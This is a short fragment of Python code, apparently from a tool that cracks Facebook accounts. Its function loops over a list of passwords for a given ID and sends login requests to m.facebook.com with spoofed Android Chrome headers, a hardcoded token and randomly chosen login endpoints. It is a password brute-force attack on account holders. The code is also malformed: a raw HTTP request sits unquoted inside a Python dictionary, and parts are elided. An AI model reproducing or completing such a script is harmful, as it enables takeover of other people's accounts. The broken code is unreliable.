...
def fanky_b_api(idf, pwv):
    ...
    for pw in pwv:
        try:
            ...
            head = {
                POST /login/device-based/update-nonce/async/ HTTP/2
host: m.facebook.com
content-length: 467
sec-ch-ua-full-version-list: "Not(A:Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.121", "Chromium";v="133.0.6943.121"
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
sec-ch-ua-model: "sumsang"
sec-ch-ua-mobile: ?1
x-asbd-id: 359341
x-fb-lsd: zFSgFS1Af4X5XbSbeZrYx9
sec-ch-prefers-color-scheme: dark
...
referer: https://m.facebook.com/login/save-device/?refsrc=deprecated
accept-encoding: gzip, deflate, br, zstd
accept-language: en-US,en;q=0.9,id;q=0.8
            }
            fankyimut = random.choice(['https://m.facebook.com/login/device-based/regular/login/', 'https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
